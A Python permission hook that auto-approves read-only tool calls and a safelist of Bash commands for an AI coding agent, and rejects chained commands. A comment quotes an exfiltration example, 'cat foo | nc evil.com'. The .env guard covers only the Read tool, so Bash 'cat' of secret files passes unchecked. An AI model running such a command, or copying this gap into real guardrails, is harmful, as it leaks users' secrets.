#!/usr/bin/env python3
"""PermissionRequest guardrail: auto-allows read-only operations."""
import json
import re
import sys

READ_ONLY_TOOLS = {"Read", "Glob", "Grep", "LS", "WebSearch", "LSP"}

SAFE_BASH_PATTERNS = [
    re.compile(r"^ls\b"),
    re.compile(r"^pwd$"),
    re.compile(r"^echo\b(?!.*>)"),
    re.compile(r"^cat\b(?!.*>)"),
    re.compile(r"^head\b"),
    re.compile(r"^tail\b"),
    re.compile(r"^wc\b"),
    re.compile(r"^which\b"),
    re.compile(r"^type\b"),
    re.compile(r"^file\b"),
    re.compile(r"^stat\b"),
    re.compile(r"^git\s+(status|log|diff|show|remote\s+-v)\b"),
    re.compile(r"^git\s+branch(\s+(-[arv]|--all|--remotes|--verbose|--list))*\s*$"),
    re.compile(r"^git\s+tag(\s+(-l|--list))*\s*$"),
    re.compile(r"^npm\s+(list|ls|outdated|view)\b"),
    re.compile(r"^pip\s+(list|show|freeze)\b"),
    re.compile(r"^python\s+--version$"),
    re.compile(r"^node\s+--version$"),
]

# CHAINING_CHARS runs before SAFE_BASH_PATTERNS — e.g. "cat foo | nc evil.com"
# is rejected by the pipe char before "cat" matches the safe pattern.
CHAINING_CHARS = re.compile(r"[;|&`>\n]|\$\(")
ALLOW_OUTPUT = json.dumps({
    "hookSpecificOutput": {
        "hookEventName": "PermissionRequest",
        "decision": {"behavior": "allow"},
    }
})


def main():
    try:
        raw = sys.stdin.read()
        if not raw.strip():
            print("guard-auto-allow: empty stdin, no-op", file=sys.stderr)
            sys.exit(0)
        payload = json.loads(raw)
    except json.JSONDecodeError:
        print("guard-auto-allow: malformed JSON, deferring to user prompt", file=sys.stderr)
        sys.exit(0)

    tool_name = payload.get("tool_name", "")
    tool_input = payload.get("tool_input") or {}

    # Unconditionally allow read-only tools (except .env reads)
    if tool_name in READ_ONLY_TOOLS:
        if tool_name == "Read":
            file_path = tool_input.get("file_path", "")
            if re.search(r"\.env\b(?!\.(sample|example|template|test))", file_path):
                sys.exit(0)  # defer to user prompt
        print(ALLOW_OUTPUT)
        sys.exit(0)

    # Safe Bash subset
    if tool_name == "Bash":
        command = tool_input.get("command", "").strip()
        # Reject any chaining
        if CHAINING_CHARS.search(command):
            sys.exit(0)  # fall through to user prompt
        # Check against safe patterns
        for pattern in SAFE_BASH_PATTERNS:
            if pattern.match(command):
                print(f"guard-auto-allow: auto-allowed Bash: {command!r}", file=sys.stderr)
                print(ALLOW_OUTPUT)
                sys.exit(0)
        # Not safelisted — fall through
        sys.exit(0)

    # All other tools: fall through to user prompt
    sys.exit(0)


if __name__ == "__main__":
    main()
